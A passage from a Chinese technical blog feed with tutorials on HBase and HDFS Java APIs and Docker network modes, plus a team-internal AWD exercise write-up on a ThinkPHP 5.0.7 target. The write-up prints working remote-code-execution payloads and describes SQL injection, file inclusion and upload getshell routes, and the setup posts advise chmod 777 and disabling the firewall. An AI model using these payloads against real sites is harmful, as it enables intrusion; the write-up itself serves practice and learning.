class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.HTableDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.TableName;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Admin;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Connection;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.ConnectionFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HBase</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Configuration</span> conf;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Connection</span> connection;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Admin</span> admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="type">String</span>[] args) <span class="keyword">throws</span> <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">        conf = <span class="type">HBaseConfiguration</span>.create();</span><br><span class="line">        conf.<span class="keyword">set</span>(<span class="string">"hbase.master"</span>, <span class="string">"192.168.111.147:16000"</span>);</span><br><span class="line"></span><br><span class="line">        connection = <span class="type">ConnectionFactory</span>.createConnection(conf);</span><br><span class="line">        admin = connection.getAdmin();</span><br><span class="line"></span><br><span class="line">        <span class="type">HTableDescriptor</span> table = new <span class="type">HTableDescriptor</span>(<span class="type">TableName</span>.valueOf(<span class="string">"table1"</span>));</span><br><span class="line">        table.addFamily(new <span class="type">HColumnDescriptor</span>(<span class="string">"group1"</span>)); <span class="comment">//创建表时至少加入一个列组</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(admin.tableExists(table.getTableName()))&#123;</span><br><span class="line">            admin.disableTable(table.getTableName());</span><br><span class="line">            admin.deleteTable(table.getTableName());</span><br><span class="line">        &#125;</span><br><span class="line">        admin.createTable(table);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行成功后成功创建<code>table1</code>表<br><img src="https://i.loli.net/2019/04/10/5cadd32dd372a.png" alt><br>转到Hbase shell使用list命令可看到新表已创建<br><img src="https://i.loli.net/2019/04/10/5cadd36ad4bda.png" alt></p><h2 id="0x05-问题解决"><a href="#0x05-问题解决" class="headerlink" title="0x05 问题解决"></a>0x05 问题解决</h2><p>此处容易出现的问题为<code>HMaster</code>启动后闪退。<br>可通过查看hbase安装目录下的<code>logs</code>文件内log日志确定该问题。</p><h3 id="HDFS问题"><a href="#HDFS问题" class="headerlink" title="HDFS问题"></a>HDFS问题</h3><p>  首先查看<code>hbase-wzb-master-wzb_node1.log</code>，此处查看你的<code>master</code>日志文件<br><img src="https://i.loli.net/2019/04/10/5cad60b6d5103.png" alt><br>发现9000的HDFS连接失败<br>首先浏览器访问你的ip的9000端口，即<code>hdfs</code>服务，访问成功如下图<br><img src="https://i.loli.net/2019/04/10/5cad5cb6557ef.png" alt><br>如果未访问成功，查看hadoop配置文件<code>core-site.xml</code><br><img src="https://i.loli.net/2019/04/10/5cad5fde7f4e3.png" alt><br>查看hdfs是否正确配置为你的ip，不是请修改，确保hbase配置文件中连接的hdfs服务器与你启动的服务器路径相同。<br>配置成功后重启hadoop，再次访问</p><h3 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h3><p>同样查看日志问题，如发现前面配置的Hbase文件夹有权限问题，请将Hbase文件夹赋予777权限<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chomd <span class="number">777</span> Hbase <span class="comment">//此处Hbase请添加你hbase-site.xml中配置的hbase.zookeeper.property.dataDir目录</span></span><br></pre></td></tr></table></figure></p><h3 id="zookeeper未正常启动问题"><a href="#zookeeper未正常启动问题" class="headerlink" title="zookeeper未正常启动问题"></a>zookeeper未正常启动问题</h3><p>查看<code>hbase-wzb-regionserver-wzb_node1.log</code>此处应修改为你的<code>regionserve</code>log文件<br>出现以下错误说明<code>zookeeper</code>未启动成功。<br><img src="https://i.loli.net/2019/04/10/5cad5e8b86672.png" alt><br>首先查看<code>sudo netstat -anp | grep 2181</code>端口是否被占用，如果占用，找到占用程序并kill掉相关进程。</p><h3 id="防火墙问题"><a href="#防火墙问题" class="headerlink" title="防火墙问题"></a>防火墙问题</h3><p>如果出现其他端口无法访问问题，请关闭防火墙<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">stop</span> firewalld.service <span class="meta">#停止firewall</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="keyword">disable</span> firewalld.service <span class="meta">#禁止firewall开机启动</span></span><br></pre></td></tr></table></figure></p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><p>配置过程中可能出现其他各种问题，可查看log文件出现的问题并解决。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Hbase全称为Hadoop Database，是一个分布式的存储系统。Hbase使用Hadoop的
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
    
      <category term="hbase" scheme="https://zhengbao.wang/tags/hbase/"/>
    
  </entry>
  
  <entry>
    <title>Docker网络模式详解</title>
    <link href="https://zhengbao.wang/Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/"/>
    <id>https://zhengbao.wang/Docker网络模式详解/</id>
    <published>2019-04-01T12:50:42.000Z</published>
    <updated>2019-04-02T01:12:40.857Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在最近使用docker搭建环境的过程中，发现docker容器默认的网络模式并不能很好的满足需求，然后便查看了一下docker关于网络配置的<a href="https://docs.docker.com/network/" target="_blank" rel="noopener">官方文档</a>，发现在官方文档中,给出了五种docker的网络模式，还是能比较全面的满足各种需求的，下面介绍一下这几种模式。</p><h2 id="0x01-bridge模式"><a href="#0x01-bridge模式" class="headerlink" title="0x01 bridge模式"></a>0x01 bridge模式</h2><p>bridge模式，这是docker容器启动时默认的网络模式，当启动容器时不提供<code>--net</code>参数时，docker容器便默认以这种模式配置网络环境。这也是在使用docker容器时，最常用的网络模式。<br>关于桥接模式，官方文档时这样说的<code>当您的应用程序在需要通信的独立容器中运行时，通常会使用桥接网络</code>。<br>简单画了个图帮助理解这种模式<br><img src="https://i.loli.net/2019/04/01/5ca1fc408a530.png" alt></p><p>实际演示：<br>首先使用默认模式即桥接模式启动两个docker容器,并查看其ip<br><img src="https://i.loli.net/2019/04/01/5ca1fcf6edf1f.png" alt><br>测试两台容器间互通<br><img src="https://i.loli.net/2019/04/01/5ca1fdb37bd30.png" alt><br>通过命令<code>docker exec bridge1 ip addr show</code>看到两个容器均虚拟出了自己的网卡<code>eth0</code><br><img src="https://i.loli.net/2019/04/01/5ca2006ed9253.png" alt><br>查看宿主机网卡，可发现多出来<code>docker0</code>，而此网卡即为各桥接模式启动的容器的网关<br><img src="https://i.loli.net/2019/04/01/5ca1fde0568e0.png" alt><br>同时宿主机上还多出来两个<code>veth</code>开头的网卡，其伴随着桥接模式容器的<code>eth0</code>网卡出现而出现。其作用为连通docker0与容器内网卡eth0。因此docker0并不只是一个简单的网卡了，而是一个网桥。<br><img src="https://i.loli.net/2019/04/01/5ca1fefd9ccfa.png" alt></p><h2 id="0x02-host模式"><a href="#0x02-host模式" class="headerlink" title="0x02 host模式"></a>0x02 host模式</h2><p>使用host模式时容器将不会获得一个独立的Network Namespace，而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。<br>实际演示<br><code>docker run -itd  --net=host --name=host awd_zentao /bin/bash</code><br>查看其网卡发现其与主机一样<br><img src="https://i.loli.net/2019/04/01/5ca2022710509.png" alt></p><h2 id="0x03-container模式"><a href="#0x03-container模式" class="headerlink" title="0x03 container模式"></a>0x03 container模式</h2><p>该模式类似于host模式，只不过host模式是主机与容器共享Network Namespace,而container模式是容器之间共享Network Namespace。新创建的容器不会创建自己的网卡，配置自己的 IP，而是和一个指定的容器共享 IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。<br>实际演示：<br>其配置方式为<code>--net=container:&lt;name_or_id&gt;</code><br>这里选择与之前的bridge1共享<br><img src="https://i.loli.net/2019/04/01/5ca2071085441.png" alt></p><h2 id="0x04-none模式"><a href="#0x04-none模式" class="headerlink" title="0x04 none模式"></a>0x04 none模式</h2><p>使用none模式不会对docker容器进行任何网络配置，只有lo本地环回网络，Docker容器没有网卡、IP、路由等信息。需要我们自己为Docker容器添加网卡、配置IP等。<br>实际演示：<br><img src="https://i.loli.net/2019/04/01/5ca2084a0187d.png" alt></p><h2 id="0x05-macvlan模式"><a href="#0x05-macvlan模式" class="headerlink" title="0x05 macvlan模式"></a>0x05 macvlan模式</h2><p>本次学习正式因为想搭建docker集群与宿主机在同一个c段，以使宿主机同c段主机可以连同docker容器，本来也可以使用bridge模式加端口映射的方法，但发现使用macvlan方式更为合适。<br>macvlan模式可以创建出一个新的自定义模式，其新启动的容器可以按新的模式配置网络环境。<br>实例演示：<br>创建新的macvlan<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker<span class="built_in"> network </span>create -d macvlan  <span class="attribute">--subnet</span>=192.168.111.0/24 <span class="attribute">--gateway</span>=192.168.111.1 -o <span class="attribute">parent</span>=ens33 gitlab-net</span><br></pre></td></tr></table></figure></p><p>使用<code>docker network ls</code>可以看到新创建的gitlab-net网络<br><img src="https://i.loli.net/2019/04/01/5ca2039cb202a.png" alt></p><p>使用<code>docker run --net=gitlab-net --ip=192.168.111.201 -dit --name test1 awd_zentao</code>即可创建新的容器，可通过<code>--net=gitlab-net</code>指定其为新的模式,<code>--ip</code>参数指定容器ip<br>查看其网卡信息<br><img src="https://i.loli.net/2019/04/01/5ca20480b8cfa.png" alt></p><p>相对于前面几种模式，该模式更加灵活，可根据实际需求配置出新的模式，满足较为复杂的网络需求。</p><h2 id="0x06-overlay模式"><a href="#0x06-overlay模式" class="headerlink" title="0x06 overlay模式"></a>0x06 overlay模式</h2><p>overlay模式可用于连接不同机器上的docker容器，允许不同机器上的容器相互通信，同时支持对消息进行加密。<br>笔者暂时未用过该模式，具体可参考<a href="https://docs.docker.com/network/overlay/" target="_blank" rel="noopener">https://docs.docker.com/network/overlay/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在最近使用docker搭建环境的过程中，发现docker容器默认的网络模式并不能很好的满足需求，然后
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="docker" scheme="https://zhengbao.wang/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>使用Hadoop JAVA API 远程连接HDFS</title>
    <link href="https://zhengbao.wang/%E4%BD%BF%E7%94%A8Hadoop-JAVA-API-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5HDFS/"/>
    <id>https://zhengbao.wang/使用Hadoop-JAVA-API-远程连接HDFS/</id>
    <published>2019-03-29T13:43:10.000Z</published>
    <updated>2019-03-29T13:50:17.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>关于hadoop的搭建，可以参考之前的一篇文章<a href="http://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">Centos7搭建Hadoop伪分布式集群详细步骤</a><br>本篇主要讲解如何使用Hadoop java api远程连接hadoop分布式文件系统（HDFS）</p><h2 id="0x01-本地操作HDFS"><a href="#0x01-本地操作HDFS" class="headerlink" title="0x01 本地操作HDFS"></a>0x01 本地操作HDFS</h2><p>在远程连接HDFS之前，先本地操作一波，便于对HDFS有个更深层的认识。</p><p>首先应该对HDFS的概念有个认识，他就是一个文件系统，只不过是适应于hadoop的分布式文件系统，既然是文件系统，其就可以执行跟普通文件系统一样的操作，例如文件操作，目录操作等。<br>下面演示几个简单的例子。</p><ul><li><p>列出目录文件<br><code>hadoop fs -ls \</code><br><img src="https://i.loli.net/2019/03/29/5c9e1850124c7.png" alt></p></li><li><p>创建文件<br><code>hadoop fs -touchz /hello</code><br><img src="https://i.loli.net/2019/03/29/5c9e19572a8b5.png" alt></p></li></ul><p>更多命令参考<a href="https://segmentfault.com/a/1190000002672666" target="_blank" rel="noopener">hadoop HDFS常用文件操作命令</a></p><h2 id="0x02-IDEA远程连接HDFS"><a href="#0x02-IDEA远程连接HDFS" class="headerlink" title="0x02 IDEA远程连接HDFS"></a>0x02 IDEA远程连接HDFS</h2><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p>首先在windows环境下安装hadoop并配置环境变量。<br>windows下配置java jdk。<br>下载winutils：<a href="https://github.com/steveloughran/winutils" target="_blank" rel="noopener">https://github.com/steveloughran/winutils</a><br>按照自己hadoop版本选择<code>hadoop.dll</code> <code>winutils.exe</code>放到hadoop bin目录下<br><img src="https://i.loli.net/2019/03/29/5c9e1c1fc8e2c.png" alt></p><h3 id="建立工程"><a href="#建立工程" class="headerlink" title="建立工程"></a>建立工程</h3><p>在IDEA下新建Maven工程<br><img src="https://i.loli.net/2019/03/29/5c9e1cba5d20a.png" alt></p><p>创建过程中右下角会出现import提醒，点击import。</p><p>创建完成后下载对应版本的hadoop pom.xml文件<br>这里我的为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-mapreduce-client-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-hdfs<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>将之前配置的<code>core-site.xml</code> <code>hdfs-site.xml</code> <code>log4j.properties</code>复制到resources目录</p><p>目录结构如下<br><img src="https://i.loli.net/2019/03/29/5c9e1dbc73a0e.png" alt></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>新建class<br><img src="https://i.loli.net/2019/03/29/5c9e1e0813184.png" alt><br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package hadoop;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FSDataInputStream;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FSDataOutputStream;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.<span class="built_in">FileSystem</span>;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> class hadoop&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line">        <span class="built_in">try</span>&#123;</span><br><span class="line">            <span class="keyword">String</span> filename = <span class="string">"hdfs://192.168.111.141:9000/user/input/boogle.txt"</span>;</span><br><span class="line">            Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">            <span class="built_in">FileSystem</span> fileSystem = <span class="built_in">FileSystem</span>.<span class="built_in">get</span>(configuration);</span><br><span class="line">            <span class="built_in">if</span>(fileSystem.<span class="built_in">exists</span>(<span class="keyword">new</span> Path(filename)))</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.<span class="built_in">println</span>(<span class="string">"文件存在"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">else</span>&#123;</span><br><span class="line">                System.out.<span class="built_in">println</span>(<span class="string">"文件不存在"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Path inFile = <span class="keyword">new</span> Path(<span class="string">"/user/input/boogle.txt"</span>);</span><br><span class="line">            FSDataOutputStream os = fileSystem.create(inFile);</span><br><span class="line">            os.writeUTF(<span class="string">"Chinese Hadoop Community"</span>);</span><br><span class="line">            os.<span class="built_in">flush</span>();</span><br><span class="line">            os.<span class="built_in">close</span>();</span><br><span class="line">            FSDataInputStream is = fileSystem.<span class="built_in">open</span>(inFile);</span><br><span class="line">            IOUtils.copyBytes(is,System.out,<span class="number">1024</span>,true);</span><br><span class="line">        &#125;<span class="built_in">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>按照自己环境修改一下上面的代码。</p><p>之前本地搭建的时候连接hdfs用的localhost，此处远程连接需换成ip。<br>如我的core-site.xml<br><img src="https://i.loli.net/2019/03/29/5c9e1e89e6e02.png" alt></p><p>查看运行结果<br><img src="https://i.loli.net/2019/03/29/5c9e1ec5aaa5f.png" alt></p><h2 id="0x03-问题解决"><a href="#0x03-问题解决" class="headerlink" title="0x03 问题解决"></a>0x03 问题解决</h2><p>因为之前hadoop环境已经搭好，容易出现的问题主要是配置IDEA配置问题和网络连接问题。</p><ul><li>关于配置没有详细讲，但是要按照每一个步骤自己操作为，并无难度，勿丢步骤即可。</li><li>关于网络连接，主要出现的问题在于防火墙禁止连接9000端口 可通过修改hosts或者修改防火墙配置</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;关于hadoop的搭建，可以参考之前的一篇文章&lt;a href=&quot;http://zhengbao.wa
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
    
  </entry>
  
  <entry>
    <title>内部AWD攻防对抗web记录</title>
    <link href="https://zhengbao.wang/%E5%86%85%E9%83%A8AWD%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97web%E8%AE%B0%E5%BD%95/"/>
    <id>https://zhengbao.wang/内部AWD攻防对抗web记录/</id>
    <published>2019-03-27T13:45:46.000Z</published>
    <updated>2019-03-29T13:46:16.769Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>团队内部进行了一次awd演练，其中web服务器环境基于<code>thinkphp v5.0.7</code>。包含两个个框架通用漏洞，四个魔改过的漏洞，特此记录一下。<br><img src="https://i.loli.net/2019/03/27/5c9b7915ea87b.png" alt></p><h2 id="0x01-thinkphp5-Request-远程代码执行漏洞"><a href="#0x01-thinkphp5-Request-远程代码执行漏洞" class="headerlink" title="0x01 thinkphp5 Request 远程代码执行漏洞"></a>0x01 thinkphp5 Request 远程代码执行漏洞</h2><p>该漏洞详情及修复可见本人博客<a href="http://zhengbao.wang/thinkphp5-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">thinkphp5 Request 远程代码执行漏洞分析</a><br>问题出在核心类Request的method方法。由于未对传入的$method进行限制，导致可以对本类任意方法进行调用且参数可控。<br>payload<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//post</span></span><br><span class="line">_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">filter</span>=<span class="title">system</span>&amp;<span class="title">boo</span>=<span class="title">whoami</span></span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/27/5c9b7bc2c5ed1.png" alt></p><h2 id="0x02-thinkphp5-x-远程代码执行漏洞"><a href="#0x02-thinkphp5-x-远程代码执行漏洞" class="headerlink" title="0x02 thinkphp5.x 远程代码执行漏洞"></a>0x02 thinkphp5.x 远程代码执行漏洞</h2><p>该漏洞详情及修复可见本人博客<a href="http://zhengbao.wang/thinkphp5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">thinkphp5.x 远程代码执行漏洞</a><br>漏洞的成因是因为在没有开启强制路由的情况下控制器没过滤所引起的远程代码执行漏洞<br>payload<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span><span class="params">[0]</span>=<span class="title">system</span>&amp;<span class="title">vars</span><span class="params">[1]</span></span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/27/5c9b7d596ef65.png" alt></p><h2 id="0x03-thinkphp-缓存函数设计缺陷-getshell"><a href="#0x03-thinkphp-缓存函数设计缺陷-getshell" class="headerlink" title="0x03 thinkphp 缓存函数设计缺陷 getshell"></a>0x03 thinkphp 缓存函数设计缺陷 getshell</h2><p>该漏洞详情及修复可见本人博客<a href="http://zhengbao.wang/thinkphp-%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7-getshell/">thinkphp 缓存函数设计缺陷 getshell</a></p><p>漏洞成因是因为thinkphp缓存函数未对其缓存内容进行过滤就直接写入缓存文件。该漏洞利用需要能够控制缓存内容并且猜解缓存文件。这里靶场环境给出了这些很好的条件。</p><p>首先漏洞出现在后台网站配置，可以使用弱口令<code>admin admin</code>登陆。<br><img src="https://i.loli.net/2019/03/27/5c9b804aaedb3.png" alt><br>配置后调用save方法保存配置内容，其内容未经过过滤保存到数据库。<br><img src="https://i.loli.net/2019/03/27/5c9b80b973e58.png" alt><br>当页面再次载入会进入缓存函数，将提交的内容直接进行缓存。<br><img src="https://i.loli.net/2019/03/27/5c9b81d947d89.png" alt><br>这里很贴心的是直接将缓存目录输出了，不需要进行猜测了。<br><img src="https://i.loli.net/2019/03/27/5c9b825a9cc98.png" alt></p><h2 id="0x04-sql注入漏洞"><a href="#0x04-sql注入漏洞" class="headerlink" title="0x04 sql注入漏洞"></a>0x04 sql注入漏洞</h2><p>问题出现再在index.php/index/index/shipinok<br>这里直接将获取的ip带入sql查询<br><img src="https://i.loli.net/2019/03/27/5c9b831202579.png" alt><br>跟进getIP()函数，发现未对ip进新过滤。<br><img src="https://i.loli.net/2019/03/27/5c9b83d20078d.png" alt><br>直接构造<code>X-Forwarded-For</code><br><img src="https://i.loli.net/2019/03/27/5c9b8446dfd46.png" alt></p><h2 id="0x05-任意文件包含"><a href="#0x05-任意文件包含" class="headerlink" title="0x05 任意文件包含"></a>0x05 任意文件包含</h2><p>在推广处直接通过post方式获取内容进行了包含<br><img src="https://i.loli.net/2019/03/27/5c9b853320d1e.png" alt></p><p><img src="https://i.loli.net/2019/03/27/5c9b857531665.png" alt></p><h2 id="0x06-任意文件上传"><a href="#0x06-任意文件上传" class="headerlink" title="0x06 任意文件上传"></a>0x06 任意文件上传</h2><p>该漏洞对thinkphp file类进行了魔改，使上传文件验证规则为空，造成任意文件上传。<br><img src="https://i.loli.net/2019/03/28/5c9c356262f55.png" alt><br>文件名为MD5(filename+’x’)<br><img src="https://i.loli.net/2019/03/28/5c9c36044153d.png" alt><br>在多处上传中均存在该问题。<br><img src="https://i.loli.net/2019/03/28/5c9c366f99e04.png" alt><br>这里以代理后台头像上传为例<br><img src="https://i.loli.net/2019/03/28/5c9c351108a5e.png" alt><br>然后得到文件保存位置即可。<br><img src="https://i.loli.net/2019/03/28/5c9c374def3ae.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;团队内部进行了一次awd演练，其中web服务器环境基于&lt;code&gt;thinkphp v5.0.7&lt;/
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="AWD" scheme="https://zhengbao.wang/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>Centos7搭建Hadoop伪分布式集群详细步骤</title>
